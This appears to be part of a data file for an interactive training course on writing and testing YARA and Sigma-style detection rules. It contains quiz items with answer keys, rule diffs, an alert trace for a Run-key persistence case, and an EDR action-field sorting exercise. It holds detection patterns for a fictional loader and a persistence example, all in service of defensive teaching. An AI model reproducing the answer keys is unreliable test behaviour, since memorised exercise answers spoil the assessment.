          { id: "count", q: "What is #loop for this file?", hint: "Count the rows.", answer: ["4", "four"], why: "Four rows carry $loop. The middle bytes differ on each row, and the [2-6] gap accepts them all." },
          { id: "first", q: "What is @loop[1]?", hint: "The first occurrence's offset.", answer: ["0x1a40", "1a40"], why: "Numbering starts at 1, so @loop[1] is the first match and @loop[4] is the last." },
          { id: "more", q: "Does #loop > 3 hold? (yes/no)", hint: "Use your count.", answer: ["yes", "y"], why: "4 is more than 3. One or two hits of a short pattern can be chance, and a repeat is a habit." },
          { id: "mz", q: "Does $mz at 0 hold? (yes/no)", hint: "Read the first row's offset.", answer: ["yes", "y"], why: "The MZ bytes sit at the very first byte, which is where a real executable's header belongs." },
          { id: "word", q: "The file also holds the word autoflush. Would $verb match inside it? (yes/no)", hint: "$verb has fullword.", answer: ["no", "n"], why: "fullword needs a non-alphanumeric character on both sides, and here the letter o sits right before flush." },
        ],
      },
    ],
    // ── Reading 6: a YARA rule step by step ──
    "sigyara-r6": [
      {
        kind: "tune",
        title: "Write It Tight: Count and Ceiling",
        prompt: "Tatiana's rule counts $rot, the sample's short decode step, and bounds the file by size. The test sets are ready: five known-bad builds and seven goodware files. Set both dials so every known-bad file fires and no goodware does.",
        primer: {
          title: "Testing Against Two Sets",
          fold: true,
          points: [
            "A condition of `#rot >= 6` and `filesize <= 300KB` needs both to be true, so each dial removes a different crowd.",
            "Test on two sets. Known-bad proves the rule still catches the family. Known-benign measures what else it hits. Either one alone tells you half.",
            "The best benign set is your own software.",
            "**Retrohunting** runs a new rule over files already collected, days or weeks back, so both numbers arrive before it goes live.",
          ],
          example: {
            label: "Worked example: reading one deploy of another family's rule",
            lines: [
              "Rule: `#key >= 4 and filesize <= 900KB`. Sets: 8 known-bad, 300 known-benign.",
              "Result: 7 caught, 2 false.",
              "The missed file has `#key` of 3, so that's the count dial.",
              "The two false files have `#key` of 6 and weigh 880 KB, so that's the size dial.",
            ],
          },
        },
        eventColumn: "File (test set)",
        dials: [
          { id: "rot", label: "#rot at least", short: "#rot", min: 1, max: 20, step: 1, start: 1 },
          { id: "size", label: "filesize at most", short: "KB", unit: "KB", min: 100, max: 1000, step: 25, start: 1000, dir: "below" },
        ],
        events: [
          { id: "b1", label: "Known-bad: calhelper.exe from PEL-BLD-03", bad: true, values: { rot: 14, size: 84 } },
          { id: "b2", label: "Known-bad: build from PEL-QA-07 quarantine", bad: true, values: { rot: 12, size: 96 } },
          { id: "b3", label: "Known-bad: build with fewer hidden strings", bad: true, values: { rot: 9, size: 167 } },
          { id: "b4", label: "Known-bad: stripped build", bad: true, values: { rot: 11, size: 131 } },
          { id: "b5", label: "Known-bad: DLL build", bad: true, values: { rot: 9, size: 212 } },
          { id: "g1", label: "Goodware: Calibration Studio installer", bad: false, values: { rot: 22, size: 18400 } },
          { id: "g2", label: "Goodware: TLS library helper", bad: false, values: { rot: 16, size: 640 } },
          { id: "g3", label: "Goodware: VPN client helper", bad: false, values: { rot: 13, size: 410 } },
          { id: "g4", label: "Goodware: remote support agent", bad: false, values: { rot: 10, size: 236 } },
          { id: "g5", label: "Goodware: licence client", bad: false, values: { rot: 8, size: 120 } },
          { id: "g6", label: "Goodware: firmware flasher", bad: false, values: { rot: 7, size: 190 } },
          { id: "g7", label: "Goodware: checksum tool", bad: false, values: { rot: 4, size: 72 } },
        ],
        goal: { catch: 5, maxFalse: 0 },
        deploys: 3,
        lesson: "A count and a ceiling remove different crowds. The count drops small tools that hold the pattern a few times by chance. The ceiling drops big software full of crypto code that holds it many times. The right values come from the two sets: the last known-bad file and the nearest goodware file mark the limits, and a round number rarely lands between them.",
      },
      {
        kind: "spotdiff",
        title: "From Goodware Match to Tight Rule",
        prompt: "On the left, Sunil's draft that matched 412 ordinary files. On the right, the version Tatiana signed. Tap each line that stops it matching goodware. Two lines changed without doing that.",
        primer: {
          title: "What Tightens a YARA Rule",
          fold: true,
          points: [
            "A string can be swapped for one tied to how the family works.",
            "`any of them` lets one string fire the rule. `N of them` needs several at once, so a common string can stay and still can't fire alone.",
            "`uint16(0) == 0x5A4D` reads the first two bytes as a number: the MZ header again, without a string.",
            "Some edits change a rule's text and leave its matches alone. Ask of each changed line: would a different set of files fire?",
          ],
          example: {
            label: "Worked example: a Linux coin miner, line by line",
            lines: [
              "`$a = \"libcurl\"`: thousands of Linux programs carry this.",
              "`$b = \"stratum+tcp://\"`: the mining protocol the tool has to speak.",
              "`uint32(0) == 0x464C457F`: the file is an ELF, the Linux executable format.",
              "`$a and $b and uint32(0) == 0x464C457F`: libcurl stays, and can't fire by itself.",
            ],
          },
        },
        goodTitle: "v1: Sunil's draft, 412 goodware matches",
        suspectTitle: "v2: signed by Tatiana",
        good: [
          "import \"pe\"",
          "rule Calhelper_Draft {",
          y(1, "strings:"),
          y(2, "$api = \"VirtualAlloc\" ascii"),
          y(2, "$web = \"http://\" ascii"),
          y(2, "$fmt = \"id=%s&st=%d&ck=%08x\" ascii"),
          y(2, "$pip = \"\\\\\\\\.\\\\pipe\\\\pcal_ctl\" ascii wide"),
          y(2, "$err = \"conect fail retry\" ascii"),
          y(1, "condition:"),
          y(2, "any of them"),
          y(2, "and uint16(0) == 0x5A4D"),
          y(2, "and filesize < 20MB"),
          "}",
        ],
        suspect: [
          "import \"pe\"",
          "rule Calhelper_Loader {",
          y(1, "strings:"),
          y(2, "$rot = { 33 C1 C1 C0 05 }"),
          y(2, "$web = \"http://\" ascii"),
          y(2, "$fmt = \"id=%s&st=%d&ck=%08x\" ascii"),
          y(2, "$pip = \"\\\\\\\\.\\\\pipe\\\\pcal_ctl\" ascii wide"),
          y(2, "$err = \"conect fail retry\" ascii"),
          y(1, "condition:"),
          y(2, "3 of them and #rot >= 9"),
          y(2, "and pe.is_pe"),
          y(2, "and filesize <= 225KB"),
          "}",
        ],
        diffs: [
          { line: 3, why: "VirtualAlloc sits in a huge share of Windows programs. $rot is the family's own decode step, so this slot now holds something tied to how the sample works." },
          { line: 9, why: "any of them let one string fire the rule, and http:// alone was enough. Now three strings must appear and the decode step must repeat, so http:// can stay without firing anything by itself." },
          { line: 11, why: "20MB let almost every installer into scope. 225KB fits the family, from your tuning: above the largest known-bad file and below the nearest goodware." },
        ],
        decoys: [
          { line: 1, why: "A new name for the rule. It reads better in an alert and changes nothing about which files match." },
          { line: 10, why: "Both lines ask if this is a Windows executable, one from the first two bytes and one from the parsed headers. Neither says anything about this family." },
        ],
        lesson: "A goodware match has a cause you can name: a string everyone has, a condition that lets one string carry the rule, or a size that admits everything. Fix each cause. Then run both test sets again, because a rule that went quiet on goodware has still to prove it catches the family.",
        hud: "Tap the lines that stop v2 matching goodware",
        sameLine: "That line is the same in both versions.",
        winTitle: "Three causes fixed",
        howTo: [
          "Read v1 and v2 side by side, line by line.",
          "Tap a line in v2 that changes which files match.",
          "A change that leaves the matches alone costs a life and tells you why.",
        ],
      },
      {
        kind: "sequence",
        title: "From Hypothesis to Sign-Off",
        prompt: "Here's how the Calhelper rule actually got made, shuffled. Put Tatiana's morning back in order.",
        items: [
          { id: "e", text: "Ran the draft over the known-bad builds and Pelham's own software", note: "Two sets, because either one alone tells half the story." },
          { id: "a", text: "Wrote one line: this loader hides its strings and decodes each one with the same short routine", note: "The idea comes first, in plain words, with no syntax yet." },
          { id: "c", text: "Added the decode count and the check-in format beside the first string", note: "A second kind of signal, from a different part of the file." },
          { id: "f", text: "Recorded which real files matched, then set the severity last", note: "Only real results can say what legitimately matches, and how loud the rule should be." },
          { id: "b", text: "Tried the first string that came to hand, and asked who else has it", note: "An obvious draft is fine, as long as it gets checked in both directions." },
          { id: "d", text: "Set a size ceiling and limited the rule to Windows executables", note: "Once the signals are in, narrow the scope around them." },
        ],
        order: ["a", "b", "c", "d", "e", "f"],
        doneNote: "The idea, a quick draft, a check in both directions, more signals, a narrower scope, a test on both sets, then notes and severity. Each step uses what the one before produced, and severity goes last because it depends on what testing found.",
      },
    ],
    // ── Boss: an alert read back against its rule ──
    "sigyara-la1": [
      {
        kind: "trace",
        title: "Walk an Alert Back Through Its Rule",
        prompt: "Tatiana's Run key rule just fired on PEL-ENG-22. Before anyone argues about the alert, read it against the rule's own logic. Click the row that answers each step.",
        primer: {
          title: "Each Block Gets Its Own Answer",
          fold: true,
          points: [
            "A rule is read in two passes: each block gets a yes or no from the event's fields, then the condition works from those answers.",
            "`condition: selection and not filter` fires when the selection matched and the filter did not.",
            "With no modifier, a filter line needs the whole value to be equal.",
            "Every line added to a selection is one more test an event must pass. Whatever lacks that detail goes unseen, so a supporting detail usually belongs in triage.",
          ],
          example: {
            label: "Worked example: a rule on new Windows services",
            lines: [
              "Selection: `ImagePath|contains: '\\Temp\\'`. Event: `C:\\Windows\\Temp\\agent.exe`. Passes.",
              "Filter: `ImagePath: 'C:\\Program Files\\Backup\\agent.exe'`. Same name, other path. Doesn't match.",
              "`selection and not filter`: true and true, so the alert stands.",
            ],
          },
        },
        lead: "Sysmon Event 13 on PEL-ENG-22. Rule: Run Key Points at a Writable Folder, level high, category registry_set, condition: selection and not filter.",
        steps: [
          {
            id: "sel", ask: "The rule lists two values under TargetObject. Which row does this event satisfy?",
            source: "Rule selection against the event",
            columns: ["Field", "Rule value", "Event value"],
            rows: [
              ["TargetObject|contains", "\\CurrentVersion\\RunOnce\\", "HKU\\S-1-5-21-2401877311-3076150984-1902204519-1107\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CalSync"],
              ["TargetObject|contains", "\\CurrentVersion\\Run\\", "HKU\\S-1-5-21-2401877311-3076150984-1902204519-1107\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CalSync"],
              ["Details|contains", "\\Users\\Public\\", "C:\\ProgramData\\CalSync\\CalUpdater.exe"],
              ["Details|contains", "\\ProgramData\\", "C:\\ProgramData\\CalSync\\CalUpdater.exe"],
            ],
            answer: 1,
            why: "The key path holds \\Run\\, not \\RunOnce\\. A list under one field is OR, so one value is enough, and the Details list passes the same way on \\ProgramData\\.",
            learned: "Selection matched on Run and ProgramData",
          },
          {
            id: "filter", ask: "The filter lists two exact Image values: C:\\Program Files\\Pelham\\CalUpdater\\CalUpdater.exe and C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe. Which of this week's events does it leave standing?",
            source: "Sysmon Event 13 · this week",
            columns: ["Time", "Image", "Computer"],
            rows: [
              ["Mon 09:14", "C:\\Program Files\\Pelham\\CalUpdater\\CalUpdater.exe", "PEL-QA-07"],
              ["Tue 13:02", "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", "PEL-ENG-19"],
              ["Wed 11:30", "C:\\Program Files\\Pelham\\CalUpdater\\CalUpdater.exe", "PEL-ENG-31"],
              ["Thu 07:48", "C:\\ProgramData\\CalSync\\CalUpdater.exe", "PEL-ENG-22"],
            ],
            answer: 3,
            why: "The file name is the same and the path is not. The filter holds exact values, and this string equals neither of them, so the filter doesn't match and the selection's answer stands.",
            learned: "Filter did not match: other folder, same name",
          },
          {
            id: "review", ask: "Three reviewers commented on the rule. Which proposal would make it stop firing on a Run value that launches a script or a DLL?",
            source: "Rule review comments",
            columns: ["Reviewer", "Proposed change"],
            rows: [
              ["m.quist", "Also require Details|endswith: '.exe'"],
              ["d.vance", "Add \\RunOnceEx\\ to the TargetObject list"],
              ["l.haddad", "Add the new backup agent's exact path to the filter"],
            ],
            answer: 0,
            why: "Every hit so far ended in .exe, which makes it tempting. As a requirement it would drop any Run value that ends another way, such as wscript C:\\ProgramData\\x.vbs. The .exe detail helps at triage.",
            learned: "A required detail narrows the rule",
          },
          {
            id: "action", ask: "The EDR saw the same write. Which line says whether the write was stopped?",
            source: "EDR detection record · PEL-ENG-22",
            columns: ["Field", "Value"],
            rows: [
              ["detect_name", "Persistence via Run key"],
              ["severity", "High"],
              ["action_taken", "none (policy is detect only)"],
              ["file_name", "CalUpdater.exe"],
            ],
            answer: 2,
            why: "Severity rates what was seen. action_taken says what the sensor did about it, and here that's nothing, so the value is in the registry now.",
            learned: "Nothing stopped the write",
          },
        ],
        howTo: ["Read the question for this step.", "Compare the rule with the event's values.", "Tap the row that answers it; the next table opens."],
      },
      {
        kind: "sort",
        title: "Did the Sensor Stop It?",
        prompt: "The sign-off review asks one thing of every alert: did this action finish? Tatiana reads you lines from Pelham's EDR records. Sort them by what really happened on the host.",
        primer: {
          title: "What a Record's Action Field Tells You",
          fold: true,
          points: [
            "A detection has two halves: what the sensor saw and what the sensor did. Read them apart.",
            "What it did depends on policy. A prevention policy blocks, and a detect-only policy records and lets the action run.",
            "That field reports the sensor's own action, under the policy it was given.",
            "If the action finished, treat what it touched as touched. A rule's level and what the host can reach set how fast you move.",
          ],
          example: {
            label: "Worked example: the same idea at a mail gateway",
            lines: [
              "`Quarantined`: the message never reached the inbox.",
              "`Delivered, tagged [External]`: the gateway saw it and the user has it.",
              "The second one is the one to chase, even if its score is lower.",
            ],
          },
        },
        buckets: [
          { id: "stopped", label: "Stopped before it finished" },
          { id: "through", label: "It went through" },
        ],
        items: [
          { id: "d1", text: "Prevention, process killed before the write", bucket: "stopped", why: "The process died first, so the write never happened. Still worth investigating, with far less to clean up." },
          { id: "d2", text: "Audit mode: would have blocked", bucket: "through", why: "Would have is the key phrase. Audit mode records what a block would have done, and the action ran." },
          { id: "d3", text: "Operation blocked by policy", bucket: "stopped", why: "The sensor refused the operation." },
          { id: "d4", text: "Alert only, prevention setting off", bucket: "through", why: "An alert is a record. With prevention off, the action completed while the record was written." },
          { id: "d5", text: "File quarantined before execution", bucket: "stopped", why: "The file never ran, so nothing it would have done took place." },
          { id: "d6", text: "Process killed 40 seconds after it read the share", bucket: "through", why: "The kill was real, and it came after the read. Whatever was read has been read." },
          { id: "d7", text: "Logged for visibility", bucket: "through", why: "Visibility means recording. The action ran as normal." },
        ],
      },
    ],
  },
};
